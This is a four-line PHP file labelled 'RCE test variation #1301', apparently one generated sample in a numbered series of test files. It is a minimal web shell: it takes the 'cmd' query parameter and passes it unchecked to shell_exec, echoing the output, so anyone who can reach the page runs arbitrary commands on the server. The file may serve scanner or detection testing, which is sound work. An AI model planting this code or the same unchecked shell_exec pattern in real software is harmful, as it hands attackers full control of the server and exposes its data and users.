<?php
// RCE test variation #1301
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>